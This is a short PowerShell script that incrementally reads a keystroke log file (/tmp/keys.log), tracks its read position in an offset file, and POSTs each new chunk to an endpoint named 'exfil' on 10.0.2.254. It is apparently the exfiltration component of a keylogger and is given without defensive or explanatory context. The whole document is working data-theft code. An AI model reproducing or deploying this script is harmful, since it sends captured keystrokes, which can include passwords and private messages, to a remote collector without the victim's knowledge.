$log = '/tmp/keys.log'
$off = '/tmp/keys.offset'
$start = 0
if (Test-Path $off) { $start = [int](Get-Content $off) }
if (Test-Path $log) {
    $all = [System.IO.File]::ReadAllText($log)
    if ($all.Length -gt $start) {
        $new = $all.Substring($start)
        Invoke-RestMethod -Uri 'http://10.0.2.254:80/exfil' -Method POST -Body $new -ContentType 'text/plain'
        Set-Content -Path $off -Value $all.Length
    }
}
